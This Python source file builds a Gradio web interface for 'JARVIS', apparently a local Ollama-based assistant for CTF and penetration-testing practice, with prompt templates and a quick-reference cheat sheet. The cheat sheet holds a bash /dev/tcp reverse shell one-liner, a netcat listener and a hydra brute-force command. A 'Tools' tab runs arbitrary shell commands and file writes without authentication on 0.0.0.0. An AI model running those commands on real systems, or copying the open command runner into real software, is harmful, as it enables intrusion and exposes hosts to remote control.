"""
JARVIS Web UI — Gradio Interface
Cybersecurity AI Assistant with voice + chat
"""

import gradio as gr
import threading
import queue
import time
import json
import re
import os
from jarvis_core import JarvisAssistant, OLLAMA_MODEL

# ──────────────────────────────────────────────
# GLOBAL STATE
# ──────────────────────────────────────────────
assistant = JarvisAssistant()

CTF_TEMPLATES = {
    "Web - SQLi": "I have a web challenge. The login form at http://target.thm/login seems vulnerable. Help me test for SQL injection.",
    "Web - XSS": "Help me find and exploit XSS on a web challenge. The site reflects user input in the page.",
    "Crypto - Caesar": "I have a cipher text that might be Caesar cipher: 'Khoor Zruog'. Help me crack it.",
    "Crypto - RSA": "I have RSA challenge: n=..., e=65537, c=... Help me factor n and decrypt.",
    "Forensics - File": "I have a forensics challenge. I found a suspicious file. How do I analyze it with file, strings, exiftool, binwalk?",
    "Pwn - Buffer Overflow": "Help me exploit a buffer overflow. The binary has no stack canary. How do I find the offset and control RIP?",
    "Reversing - Binary": "I need to reverse engineer a binary. Help me use Ghidra/radare2 to find the flag check logic.",
    "Steganography": "I have an image that might contain a hidden flag. What steganography tools and techniques should I use?",
    "OSINT": "I have an OSINT challenge. I need to find information about a target using only public sources.",
    "Hash Cracking": "I have a hash to crack: 5f4dcc3b5aa765d61d8327deb882cf99. Help me identify and crack it.",
}

QUICK_COMMANDS = [
    ("🔍 Port Scan", "Show me how to run a comprehensive nmap scan on a target IP, including service detection and scripts."),
    ("🕸️ Dir Busting", "How do I enumerate hidden directories and files on a web server using gobuster or ffuf?"),
    ("🔑 Hash Crack", "Explain how to crack MD5, SHA1, NTLM hashes using hashcat and john the ripper with wordlists."),
    ("💉 SQLi Cheatsheet", "Give me a SQL injection cheatsheet for CTF web challenges including bypass techniques."),
    ("🐚 Reverse Shell", "Give me a collection of reverse shell one-liners for bash, python, php, and netcat."),
    ("🔐 Privesc Linux", "Walk me through Linux privilege escalation enumeration steps and common techniques."),
    ("📦 Buffer Overflow", "Explain buffer overflow exploitation step by step: finding offset, bad chars, generating shellcode."),
    ("🔭 OSINT Tools", "List the best OSINT tools and techniques for CTF challenges and authorized recon."),
]


# ──────────────────────────────────────────────
# CHAT HANDLER
# ──────────────────────────────────────────────
def chat(message, history, model_name):
    if not message.strip():
        yield history, ""
        return

    # Update model if changed
    import jarvis_core
    jarvis_core.OLLAMA_MODEL = model_name

    history = list(history or [])
    history.append({"role": "user", "content": message})
    history.append({"role": "assistant", "content": "⏳ Thinking..."})
    yield history, ""

    # Collect full response then update
    response_parts = []

    def on_token(t):
        response_parts.append(t)

    try:
        assistant.process(message, on_token=on_token)
    except Exception as e:
        response_parts.append(f"❌ Error: {e}")

    full = "".join(response_parts)
    full = format_response(full) if full.strip() else "⚠️ No response from Ollama. Is it running?"
    history[-1] = {"role": "assistant", "content": full}
    yield history, ""


def format_response(text: str) -> str:
    """Clean up response for display"""
    # Remove tool XML tags but keep content readable
    text = re.sub(r"<tool>(.*?)</tool>", lambda m: f"\n```json\n{m.group(1).strip()}\n```\n", text, flags=re.DOTALL)
    return text


def use_template(template_key, history):
    msg = CTF_TEMPLATES.get(template_key, "")
    return msg, history


def quick_cmd(cmd_text, history):
    return cmd_text, history


def reset_chat():
    try:
        assistant.llm.reset()
    except Exception:
        pass
    return [], ""


def get_available_models():
    try:
        import requests
        resp = requests.get("http://localhost:11434/api/tags", timeout=3)
        models = [m["name"] for m in resp.json().get("models", [])]
        return models if models else [OLLAMA_MODEL]
    except Exception:
        return [OLLAMA_MODEL, "llama3.2", "deepseek-r1", "qwen2.5", "mistral"]


# ──────────────────────────────────────────────
# TOOL RUNNER (direct from UI)
# ──────────────────────────────────────────────
def run_direct_tool(tool_name, param1, param2):
    from jarvis_core import run_tool
    params = {}
    if tool_name == "run_command":
        params = {"command": param1}
    elif tool_name == "web_search":
        params = {"query": param1}
    elif tool_name == "read_file":
        params = {"path": param1}
    elif tool_name == "write_file":
        params = {"path": param1, "content": param2}
    elif tool_name == "decode":
        params = {"text": param1, "encoding": param2}
    return run_tool(tool_name, params)


# ──────────────────────────────────────────────
# GRADIO UI
# ──────────────────────────────────────────────
CSS = """
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');

:root {
    --bg: #020408;
    --bg2: #060d14;
    --panel: #0a1520;
    --border: #0f3460;
    --accent: #00d4ff;
    --accent2: #ff6b35;
    --accent3: #39ff14;
    --text: #c8e8ff;
    --dim: #4a7a9b;
    --danger: #ff2244;
}

* { font-family: 'Share Tech Mono', monospace !important; }

body, .gradio-container {
    background: var(--bg) !important;
    color: var(--text) !important;
}

.gradio-container { max-width: 100% !important; padding: 0 !important; }

/* Header */
.jarvis-header {
    background: linear-gradient(135deg, #020408 0%, #0a1520 50%, #020408 100%);
    border-bottom: 1px solid var(--border);
    padding: 20px 32px;
    display: flex;
    align-items: center;
    gap: 20px;
    position: relative;
    overflow: hidden;
}

.panel-title {
    color: var(--accent) !important;
    font-size: 13px !important;
    letter-spacing: 2px !important;
    margin-bottom: 0px !important;
    padding-bottom: 0px !important;
    border-bottom: none !important;
    display: block !important;
    font-weight: 700 !important;
}

.jarvis-header::before {
    content: '';
    position: absolute;
    top: 0; left: 0; right: 0; bottom: 0;
    background: repeating-linear-gradient(
        0deg,
        transparent,
        transparent 2px,
        rgba(0,212,255,0.02) 2px,
        rgba(0,212,255,0.02) 4px
    );
}

.jarvis-logo {
    font-family: 'Orbitron', sans-serif !important;
    font-size: 28px;
    font-weight: 900;
    color: var(--accent);
    text-shadow: 0 0 20px var(--accent), 0 0 40px rgba(0,212,255,0.3);
    letter-spacing: 6px;
}

.jarvis-sub {
    color: var(--dim);
    font-size: 11px;
    letter-spacing: 3px;
    text-transform: uppercase;
}

.status-dot {
    width: 10px; height: 10px;
    border-radius: 50%;
    background: var(--accent3);
    box-shadow: 0 0 10px var(--accent3);
    animation: pulse 2s infinite;
}

@keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.4; }
}

/* Chatbot */
.chatbot { background: var(--bg2) !important; border: 1px solid var(--border) !important; border-radius: 0 !important; }
.chatbot .message { background: var(--panel) !important; border: 1px solid var(--border) !important; color: var(--text) !important; border-radius: 4px !important; font-size: 13px !important; }
.chatbot .message.user { background: #0a1f35 !important; border-color: #1a4a6b !important; }
.chatbot .message.bot { background: #061018 !important; border-color: var(--border) !important; }
.chatbot .message code { background: #000 !important; color: var(--accent3) !important; border: 1px solid #1a3a2a !important; }
.chatbot .message pre { background: #000 !important; border: 1px solid var(--border) !important; }

/* Input */
textarea, input[type=text] {
    background: var(--panel) !important;
    border: 1px solid var(--border) !important;
    color: var(--text) !important;
    border-radius: 0 !important;
    font-family: 'Share Tech Mono', monospace !important;
}

textarea:focus, input:focus {
    border-color: var(--accent) !important;
    box-shadow: 0 0 10px rgba(0,212,255,0.2) !important;
}

/* Buttons */
button {
    background: var(--panel) !important;
    border: 1px solid var(--border) !important;
    color: var(--text) !important;
    border-radius: 0 !important;
    font-family: 'Share Tech Mono', monospace !important;
    transition: all 0.2s !important;
}

button:hover {
    border-color: var(--accent) !important;
    color: var(--accent) !important;
    box-shadow: 0 0 10px rgba(0,212,255,0.2) !important;
}

button.primary, button[variant=primary] {
    background: linear-gradient(135deg, #003d5c, #005a80) !important;
    border-color: var(--accent) !important;
    color: var(--accent) !important;
}

/* Sidebar panels */
.sidebar-panel {
    background: var(--panel);
    border: 1px solid var(--border);
    padding: 12px;
    margin-bottom: 8px;
}

/* Quick command buttons */
.quick-btn button {
    background: #040c14 !important;
    border: 1px solid #0d2a40 !important;
    color: #6aa8c8 !important;
    font-size: 11px !important;
    padding: 6px 10px !important;
    text-align: left !important;
    width: 100% !important;
    margin-bottom: 4px !important;
}

.quick-btn button:hover {
    border-color: var(--accent) !important;
    color: var(--accent) !important;
    background: #061525 !important;
}

/* Tabs */
.tab-nav { background: var(--bg) !important; border-bottom: 1px solid var(--border) !important; }
.tab-nav button { background: transparent !important; border: none !important; color: var(--dim) !important; border-bottom: 2px solid transparent !important; border-radius: 0 !important; }
.tab-nav button.selected { color: var(--accent) !important; border-bottom-color: var(--accent) !important; }

/* Dropdowns */
.dropdown { background: var(--panel) !important; border: 1px solid var(--border) !important; }

/* Tool output */
.tool-output textarea {
    background: #000 !important;
    color: var(--accent3) !important;
    font-size: 12px !important;
    font-family: 'Share Tech Mono', monospace !important;
}

/* Scrollbar */
::-webkit-scrollbar { width: 4px; }
::-webkit-scrollbar-track { background: var(--bg); }
::-webkit-scrollbar-thumb { background: var(--border); }
::-webkit-scrollbar-thumb:hover { background: var(--accent); }

.quick-ref-panel {
    padding: 10px 12px !important;
    margin: 0 !important;
}

.quick-ref-content {
    font-size: 10px;
    color: #4a7a9b;
    line-height: 1.8;
    margin: 0 !important;
    padding: 0 !important;
}

.quick-ref-panel .panel-title {
    margin: 0 0 8px 0 !important;
    padding: 0 0 6px 0 !important;
}

.gradio-container .gr-html,
.gradio-container .gr-box,
.gradio-container .gr-block {
    margin-top: 0 !important;
}
"""

def build_ui():
    models = get_available_models()

    with gr.Blocks(title="JARVIS — CyberSec AI") as demo:
        # ── Header ──
        gr.HTML("""
        <div class="jarvis-header">
            <div class="status-dot"></div>
            <div>
                <div class="jarvis-logo">J·A·R·V·I·S</div>
                <div class="jarvis-sub">Cybersecurity AI · Local · Private · Unrestricted for Ethical Hacking</div>
                <div class="jarvis-sub">Vibe Coded by Abbhilash Simanchalam</div>
            </div>
            <div style="margin-left:auto;color:#4a7a9b;font-size:11px;text-align:right">
                <div>⚡ OLLAMA · LOCAL</div>
                <div>🛡️ ETHICAL HACKING MODE</div>
            </div>
        </div>
        """)

        # ── Main Layout ──
        with gr.Row(equal_height=False):

            # LEFT SIDEBAR
            with gr.Column(scale=1, min_width=220):

                gr.HTML('<div class="panel-title">⚙️ MODEL</div>')
                model_dd = gr.Dropdown(
                    choices=models, value=models[0],
                    label="", container=False
                )

                gr.HTML('<div class="panel-title" style="margin-top:20px">🎯 CTF TEMPLATES</div>')
                for key in CTF_TEMPLATES:
                    btn = gr.Button(f"  {key}", elem_classes=["quick-btn"])
                    btn.click(
                        lambda k=key: (CTF_TEMPLATES[k],),
                        outputs=[gr.State()]
                    )

                ctf_template_dd = gr.Dropdown(
                    choices=list(CTF_TEMPLATES.keys()),
                    label="Load CTF Template",
                    container=False
                )

                gr.HTML('<div class="panel-title" style="margin-top:20px">⚡ QUICK COMMANDS</div>')
                quick_btns = []
                for label, cmd in QUICK_COMMANDS:
                    b = gr.Button(f"  {label}", elem_classes=["quick-btn"])
                    quick_btns.append((b, cmd))

                reset_btn = gr.Button("🔄 RESET SESSION", variant="secondary")

            # CENTER — CHAT
            with gr.Column(scale=4):
                with gr.Tabs():
                    with gr.Tab("💬 Chat"):
                        chatbot = gr.Chatbot(
                            value=[],
                            height=560,
                            show_label=False,
                            render_markdown=True,
                            elem_id="main-chat"
                        )
                        with gr.Row():
                            msg_box = gr.Textbox(
                                placeholder="Ask JARVIS anything... CTF help, pentesting, exploits, reverse engineering...",
                                show_label=False,
                                scale=5,
                                lines=2
                            )
                            send_btn = gr.Button("SEND ▶", variant="primary", scale=1)

                    with gr.Tab("🔧 Tools"):
                        gr.HTML('<div style="color:#4a7a9b;font-size:12px;padding:10px 0">Run tools directly without going through the AI.</div>')
                        with gr.Row():
                            tool_select = gr.Dropdown(
                                choices=["run_command", "web_search", "read_file", "write_file", "decode"],
                                value="run_command",
                                label="Tool"
                            )
                        tool_p1 = gr.Textbox(label="Command / Query / Path / Text", lines=2)
                        tool_p2 = gr.Textbox(label="Content / Encoding (if needed)", lines=2)
                        run_tool_btn = gr.Button("▶ RUN TOOL", variant="primary")
                        tool_out = gr.Textbox(
                            label="Output",
                            lines=15,
                            interactive=False,
                            elem_classes=["tool-output"]
                        )

            with gr.Column(scale=1, min_width=220):
                gr.HTML("""
                <div class="sidebar-panel quick-ref-panel">
                 <div class="panel-title">📋 QUICK REFERENCE</div>
                 <div class="quick-ref-content">
                    <div style="color:#00d4ff">── RECON ──</div>
                    nmap -sV -sC -A target<br>
                    gobuster dir -u URL -w list<br>
                    ffuf -u URL/FUZZ -w list<br>
                    whatweb URL<br><br>

                    <div style="color:#00d4ff">── EXPLOITATION ──</div>
                    sqlmap -u URL --dbs<br>
                    msfconsole / use exploit/<br>
                    python3 exploit.py<br><br>

                    <div style="color:#00d4ff">── PASSWORDS ──</div>
                    hashcat -m 0 hash.txt rockyou<br>
                    john --wordlist=rockyou hash<br>
                    hydra -l user -P list ssh://ip<br><br>

                    <div style="color:#00d4ff">── REVERSE SHELL ──</div>
                    bash -i >& /dev/tcp/ip/4444 0>&1<br>
                    nc -lvnp 4444<br>
                    python3 -c 'import pty;pty.spawn("/bin/bash")'<br><br>

                    <div style="color:#00d4ff">── PRIVESC ──</div>
                    sudo -l<br>
                    find / -perm -4000 2>/dev/null<br>
                    linpeas.sh / winpeas.exe<br><br>

                    <div style="color:#00d4ff">── CRYPTO ──</div>
                    echo "txt" | base64 -d<br>
                    xxd file | head<br>
                    openssl enc -d -aes-256-cbc<br><br>

                    <div style="color:#00d4ff">── FORENSICS ──</div>
                    binwalk -e file<br>
                    exiftool file<br>
                    strings file | grep flag<br>
                    steghide extract -sf img<br>
                </div>
            </div>
            """)

        # ── EVENTS ──
        send_btn.click(
            chat,
            [msg_box, chatbot, model_dd],
            [chatbot, msg_box]
        )
        msg_box.submit(
            chat,
            [msg_box, chatbot, model_dd],
            [chatbot, msg_box]
        )

        reset_btn.click(reset_chat, outputs=[chatbot, msg_box])

        # CTF template loader
        def load_template(key):
            return CTF_TEMPLATES.get(key, "")
        ctf_template_dd.change(load_template, [ctf_template_dd], [msg_box])

        # Quick command buttons
        for btn, cmd_text in quick_btns:
            btn.click(lambda c=cmd_text: c, outputs=[msg_box])

        # Tool runner
        run_tool_btn.click(run_direct_tool, [tool_select, tool_p1, tool_p2], [tool_out])

    return demo


if __name__ == "__main__":
    print("🚀 Starting JARVIS Web UI...")
    print("📡 Open: http://localhost:7860")
    ui = build_ui()
    ui.launch(
        server_name="0.0.0.0",
        server_port=7860,
        theme=gr.themes.Base(),
        css=CSS,
    )